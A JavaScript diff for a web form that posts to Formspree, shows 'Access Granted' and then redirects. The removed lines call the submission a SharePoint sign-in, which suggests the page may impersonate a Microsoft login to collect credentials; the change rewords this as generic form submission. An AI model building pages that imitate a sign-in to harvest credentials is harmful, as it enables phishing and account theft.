@@ -476,7 +476,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 showStep(3);
                 updateFormTitle('Access Granted');
                 
-                console.log('Sign in successfully to SharePoint');
+                console.log('Form submitted successfully to Formspree');
                 
                 // Countdown before redirect
                 let countdown = 3;
@@ -503,12 +503,12 @@ document.addEventListener('DOMContentLoaded', function() {
             console.error('Error submitting form to Formspree:', error);
             
             // Show user-friendly error message
-            let errorMessage = 'There was an error Sign in your information. ';
+            let errorMessage = 'There was an error submitting your information. ';
             
             if (error.message.includes('NetworkError') || error.message.includes('Failed to fetch')) {
                 errorMessage += 'Please check your internet connection and try again.';
             } else if (error.message.includes('Formspree')) {
-                errorMessage += 'Sign in service is temporarily unavailable. Please try again later.';
+                errorMessage += 'Form submission service is temporarily unavailable. Please try again later.';
             } else {
                 errorMessage += 'Please try again.';
             }
